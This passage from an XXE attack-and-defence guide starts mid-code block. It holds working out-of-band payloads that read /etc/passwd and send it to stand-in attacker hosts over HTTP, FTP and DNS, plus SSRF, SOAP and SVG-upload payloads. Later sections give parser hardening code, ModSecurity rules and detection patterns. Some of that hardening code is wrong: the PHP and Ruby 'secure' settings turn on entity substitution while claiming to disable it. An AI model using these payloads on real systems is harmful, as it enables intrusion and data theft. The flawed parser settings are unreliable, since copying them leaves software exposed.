  <!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://YOUR_ID.dnslog.cn/xxe.dtd"> %dtd;]>
  ```

### Testing Methodologies

```mermaid
flowchart TD
    A[XXE Testing Methodology] --> B[Identify XML Processing Points]
    B --> C[Setup Out-of-Band Detection]
    C --> D[Test Basic XXE Payloads]
    D --> E[Analyze Results]
    E --> F[Exploit Vulnerability]
    F --> G[Expand Attack]

    B --> B1[API Endpoints]
    B --> B2[File Uploads]
    B --> B3[SOAP/Legacy Interfaces]

    C --> C1[Burp Collaborator]
    C --> C2[Custom HTTP Server]
    C --> C3[Interactsh]

    D --> D1[Classic XXE]
    D --> D2[Blind XXE]
    D --> D3[Error-based XXE]
    D --> D4[XInclude Attack]

    E --> E1[Direct Data Exposure]
    E --> E2[HTTP Callbacks]
    E --> E3[Error Messages]

    F --> F1[Local File Reading]
    F --> F2[SSRF]
    F --> F3[Advanced Exfiltration]

    G --> G1[Sensitive Data]
    G --> G2[Internal Network]
    G --> G3[RCE Attempt]
```

#### Basic Testing Process

1. **Identify XML Processing**: Locate endpoints accepting XML input
2. **Setup Monitoring**: Prepare out-of-band detection for blind XXE
3. **Injection Testing**: Test with basic XXE payloads
4. **Result Analysis**: Check for direct data exposure or callbacks
5. **Vulnerability Confirmation**: Attempt to read a harmless file like `/etc/hostname`

#### Advanced Exploitation Techniques

##### Data Exfiltration (for Blind XXE)

```mermaid
sequenceDiagram
    actor A as Attacker
    participant AS as Attacker Server (DTD)
    participant VS as Vulnerable Server
    participant FS as File System

    A->>AS: Host malicious DTD file
    A->>VS: Submit XML with reference to external DTD
    VS->>AS: Request malicious DTD
    AS->>VS: Deliver DTD with file reading & exfiltration
    VS->>FS: Read sensitive file
    Note over VS: Process DTD instructions
    VS->>AS: Make callback with file content in URL
    AS->>A: Log request with exfiltrated data
```

1. Host a malicious DTD file on your server:

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
   %exfil;
   ```

2. Use an XXE payload that references your DTD:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE data [
     <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
     %dtd;
   ]>
   <data>test</data>
   ```

##### XXE OOB with DTD and PHP filter

Payload:

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://your-attacker-server.com/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

External DTD (`http://your-attacker-server.com/dtd.xml`):

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://your-attacker-server.com/log.php?data=%data;'>">
```

##### Error-Based Exfiltration

1. Host a malicious DTD with error-based exfiltration:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
   ```

##### XXE for SSRF

Use XXE to trigger internal requests:

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://internal-service:8080/admin"> ]>
```

##### XXE Inside SOAP

```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

##### XXE PoC Examples

```xml
<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
```

##### XXE via File Upload (SVG Example)

Create an SVG file with the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

Upload it where SVG is allowed (e.g., profile picture, comment attachment).

#### Blind XXE with OOB Techniques (2024-2025)

> [!NOTE]
> Modern applications often don't reflect parsed XML in responses. Out-of-band techniques are essential for blind XXE exploitation.

**HTTP-Based OOB:**

```xml
<!-- Initial payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**evil.dtd on attacker server:**

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
%exfil;
```

**FTP-Based OOB (for binary files):**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/ftp.dtd">
  %xxe;
]>
<foo>test</foo>
```

**ftp.dtd:**

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%exfil;
```

**DNS-Based OOB (most stealthy):**

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/dns.dtd">
  %xxe;
]>
<foo>test</foo>
```

**dns.dtd:**

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com'>">
%eval;
%exfil;
```

#### Comprehensive XXE Testing Checklist

1. **Basic entity testing**:
   - Test file access via `file://` protocol
   - Test network access via `http://` protocol

2. **Content delivery**:
   - Direct XXE with immediate results
   - Out-of-band XXE with remote DTD
   - Error-based XXE for data extraction

3. **Protocol testing**:
   - Test various protocols (file, http, https, ftp, etc.)
   - Attempt restricted protocol access

4. **Format variations**:
   - Test XXE in SVG uploads
   - Test XXE in document formats (DOCX, XLSX, PDF)
   - Test SOAP/XML-RPC interfaces

5. **Bypasses**:
   - Try character encoding tricks
   - Use nested entities
   - Apply URL encoding
   - Test with namespace manipulations

## Remediation Recommendations

> [!WARNING]
> XXE vulnerabilities can lead to complete system compromise. Prevention must be implemented at multiple layers.

### Secure Parser Configurations (2024-2025)

#### Python

```python
# RECOMMENDED: Use defusedxml (secure wrapper)
from defusedxml import ElementTree as ET

# Parse XML safely
tree = ET.parse('file.xml')
root = ET.fromstring(xml_string)

# Standard library (Python >= 3.13)
import xml.etree.ElementTree as ET

# External entities disabled by default in Python 3.13+
# For older versions, use defusedxml

# lxml (if you must use it)
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,  # Disable entity resolution
    no_network=True,         # Disable network access
    dtd_validation=False,    # Disable DTD validation
    load_dtd=False           # Don't load DTD
)
tree = etree.parse('file.xml', parser)
```

#### Java

```java
// SAXParser
import javax.xml.parsers.SAXParserFactory;
import javax.xml.parsers.SAXParser;

SAXParserFactory spf = SAXParserFactory.newInstance();

// Disable DOCTYPE declarations
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable external general entities
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);

// Disable external parameter entities
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Disable external DTDs
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Disable XInclude
spf.setXIncludeAware(false);

// Enable secure processing
spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

SAXParser saxParser = spf.newSAXParser();

// DocumentBuilder
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Same features as SAXParser
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();

// XMLReader
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

#### .NET / C#

```csharp
using System.Xml;

// XmlReader (RECOMMENDED)
var settings = new XmlReaderSettings
{
    // Prohibit DTD processing (most secure)
    DtdProcessing = DtdProcessing.Prohibit,

    // Alternative: Ignore DTDs
    // DtdProcessing = DtdProcessing.Ignore,

    // Disable external resource resolution
    XmlResolver = null,

    // Maximum characters in document (DoS prevention)
    MaxCharactersInDocument = 10000000,

    // Maximum characters from entities (DoS prevention)
    MaxCharactersFromEntities = 1024
};

using (var reader = XmlReader.Create(stream, settings))
{
    // Parse XML safely
}

// XmlDocument (legacy - avoid if possible)
var doc = new XmlDocument();
doc.XmlResolver = null;  // Disable external resource resolution
doc.LoadXml(xmlString);

// LINQ to XML (XDocument)
var doc = XDocument.Parse(xmlString, LoadOptions.None);
// Note: XDocument doesn't resolve external entities by default
```

#### PHP

```php
// PHP 8.0+ (secure by default)
// External entities are disabled automatically

// PHP < 8.0 (requires explicit configuration)
// libxml_disable_entity_loader() was deprecated in 8.0

// Recommended approach for all versions
libxml_use_internal_errors(true);

// DOM
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);

// Secure configuration
$dom = new DOMDocument();
// Disable entity substitution
libxml_disable_entity_loader(true);
$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);

// SimpleXML
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($data, "SimpleXMLElement", LIBXML_NONET | LIBXML_NOCDATA);

// XMLReader
$reader = new XMLReader();
$reader->xml($xml);
// Set parser properties
$reader->setParserProperty(XMLReader::SUBST_ENTITIES, false);
$reader->setParserProperty(XMLReader::LOADDTD, false);
```

#### Node.js

```javascript
// libxmljs (requires explicit configuration)
const libxmljs = require("libxmljs");

const xml = libxmljs.parseXml(xmlString, {
  noent: false,      // Don't substitute entities
  nonet: true,       // Disable network access
  dtdload: false,    // Don't load DTD
  dtdvalid: false,   // Don't validate against DTD
  doctype: false     // Ignore DOCTYPE declarations
});

// xml2js (generally safe by default)
const xml2js = require('xml2js');

const parser = new xml2js.Parser({
  // Disable external entities
  explicitCharkey: false,
  trim: true,
  normalize: true,
  normalizeTags: true,
  // Don't allow entity expansion
  strict: true
});

// fast-xml-parser (secure by default in v4+)
const { XMLParser } = require("fast-xml-parser");

const parser = new XMLParser({
  processEntities: false,  // Don't process entities
  allowBooleanAttributes: false
});
```

#### Ruby

```ruby
# Nokogiri (>= 1.14 secure by default)
require 'nokogiri'

# Secure parsing
doc = Nokogiri::XML(xml) do |config|
  config.nonet   # Disable network access
  config.noent   # Don't substitute entities
  config.dtdload = false  # Don't load DTD
  config.dtdvalid = false # Don't validate DTD
end

# Alternative secure configuration
doc = Nokogiri::XML(xml, nil, nil, Nokogiri::XML::ParseOptions::NONET | Nokogiri::XML::ParseOptions::NOENT)

# REXML (Ruby standard library)
require 'rexml/document'

# Disable entity expansion
REXML::Security.entity_expansion_limit = 0

doc = REXML::Document.new(xml)
```

#### Go

```go
// encoding/xml (secure by default)
package main

import (
    "encoding/xml"
    "strings"
)

type Data struct {
    XMLName xml.Name `xml:"root"`
    Content string   `xml:"content"`
}

func main() {
    // Go's standard XML parser doesn't resolve external entities by default
    // No special configuration needed

    xmlData := `<?xml version="1.0"?><root><content>data</content></root>`

    var data Data
    err := xml.Unmarshal([]byte(xmlData), &data)
    if err != nil {
        // Handle error
    }

    // Custom decoder with reader
    decoder := xml.NewDecoder(strings.NewReader(xmlData))
    // Go's parser is safe by design - no external entity resolution
    err = decoder.Decode(&data)
}
```

### API Gateway XML Protection

> [!TIP]
> Implement XML protection at the gateway layer for defense-in-depth. This provides an additional security boundary before requests reach application code.

#### AWS API Gateway

```yaml
# API Gateway Request Validator
RequestValidator:
  Type: AWS::ApiGateway::RequestValidator
  Properties:
    ValidateRequestBody: true
    ValidateRequestParameters: true

# Lambda authorizer to inspect XML
def lambda_handler(event, context):
    body = event.get('body', '')

    # Block DTD declarations
    if '<!DOCTYPE' in body or '<!ENTITY' in body:
        return {
            'statusCode': 400,
            'body': 'XML DTD not allowed'
        }

    # Size limit
    if len(body) > 100000:  # 100KB
        return {
            'statusCode': 413,
            'body': 'Request too large'
        }

    # Block external entity references
    if 'SYSTEM' in body or 'PUBLIC' in body:
        return {
            'statusCode': 400,
            'body': 'External entities not allowed'
        }
```

#### Kong Gateway

```yaml
plugins:
  - name: xml-threat-protection
    config:
      source_size_limit: 1000000 # 1MB max
      name_size_limit: 255 # Max element name length
      child_count_limit: 100 # Max child elements
      attribute_count_limit: 50 # Max attributes per element
      entity_expansion_limit: 0 # Disable entity expansion
      external_entity_limit: 0 # Disable external entities
      dtd_processing: false # Disable DTD
```

#### Apigee Edge

```xml
<!-- XMLThreatProtection policy -->
<XMLThreatProtection name="XML-Threat-Protection">
  <Source>request</Source>
  <StructureLimits>
    <NodeDepth>10</NodeDepth>
    <AttributeCountPerElement>5</AttributeCountPerElement>
    <NamespaceCountPerElement>3</NamespaceCountPerElement>
    <ChildCount includeComment="true" includeElement="true" includeProcessingInstruction="true" includeText="true">10</ChildCount>
  </StructureLimits>
  <ValueLimits>
    <Text>1000</Text>
    <Attribute>100</Attribute>
    <NamespaceURI>100</NamespaceURI>
    <Comment>500</Comment>
    <ProcessingInstructionData>500</ProcessingInstructionData>
  </ValueLimits>
</XMLThreatProtection>
```

#### Nginx + ModSecurity

```nginx
# ModSecurity rules for XXE
SecRule REQUEST_BODY "@rx <!ENTITY" \
    "id:1000,phase:2,deny,status:403,msg:'XXE Attack Detected'"

SecRule REQUEST_BODY "@rx <!DOCTYPE.*\[" \
    "id:1001,phase:2,deny,status:403,msg:'DTD Declaration Blocked'"

SecRule REQUEST_BODY "@rx SYSTEM.*[\"']file:" \
    "id:1002,phase:2,deny,status:403,msg:'File protocol blocked'"

SecRule REQUEST_BODY "@rx SYSTEM.*[\"']http:" \
    "id:1003,phase:2,deny,status:403,msg:'External HTTP entity blocked'"
```

### Additional Security Controls

- **Disable DTD processing completely if possible**: Most applications don't need DTD support
- **Disable external entity resolution**: Prevent the parser from fetching external resources
- **Implement proper input validation**: Validate XML structure before parsing
- **Use safe XML parsers that disable XXE by default**: Modern parsers often have secure defaults
- **Apply patch management to XML parsers**: Keep libraries updated
- **Use newer API formats like JSON where feasible**: JSON doesn't have entity expansion
- **Network egress allow-list**: Restrict outbound traffic from XML-parsing hosts to block blind-XXE callbacks
- **Content Security Policy (CSP)**: Implement CSP headers to prevent data exfiltration
- **Rate Limiting**: Prevent DoS attacks via billion laughs
- **File Size Limits**: Restrict maximum XML document size
- **Monitoring and Alerting**: Log and alert on XXE attack indicators

### Cloud-Specific Considerations

> [!NOTE]
> Cloud environments require additional protections due to the sensitivity of metadata endpoints.

**AWS:**

```yaml
# Implement IMDSv2 only
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1

# Network ACL to block metadata access (defense in depth)
aws ec2 create-network-acl-entry \
    --network-acl-id acl-12345678 \
    --ingress \
    --rule-number 100 \
    --protocol -1 \
    --rule-action deny \
    --cidr-block 169.254.169.254/32
```

**GCP:**

```bash
# Disable legacy metadata endpoint
gcloud compute project-info add-metadata \
    --metadata disable-legacy-endpoints=true

# Use Shielded VMs
gcloud compute instances create INSTANCE_NAME \
    --shielded-secure-boot \
    --shielded-vtpm \
    --shielded-integrity-monitoring
```

**Azure:**

```bash
# Restrict metadata access using NSG
az network nsg rule create \
    --resource-group myResourceGroup \
    --nsg-name myNSG \
    --name BlockMetadata \
    --priority 100 \
    --destination-address-prefixes 169.254.169.254 \
    --destination-port-ranges '*' \
    --access Deny
```

### Monitoring and Detection

```python
# Example: Log XXE indicators
import logging
import re

XXE_PATTERNS = [
    r'<!DOCTYPE',
    r'<!ENTITY',
    r'SYSTEM\s+["\']file:',
    r'SYSTEM\s+["\']http:',
    r'SYSTEM\s+["\']php:',
    r'xmlns:xi="http://www\.w3\.org/2001/XInclude"'
]

def check_xxe_attempt(xml_input):
    for pattern in XXE_PATTERNS:
        if re.search(pattern, xml_input, re.IGNORECASE):
            logging.warning(f"Potential XXE attempt detected: {pattern}")
            # Alert security team
            alert_security_team(xml_input, pattern)
            return True
    return False
```

**SIEM Detection Rules:**

```yaml
# Splunk detection
index=web_logs
| regex _raw="(<!DOCTYPE|<!ENTITY|SYSTEM\s+.*file:|SYSTEM\s+.*http:)"
| stats count by src_ip, uri, user_agent
| where count > 3

# Elastic Security Rule
event.category:web AND
(http.request.body.content:("<!DOCTYPE" OR "<!ENTITY" OR "SYSTEM") OR
 file.path:(*xml OR *svg OR *docx OR *xlsx))
```
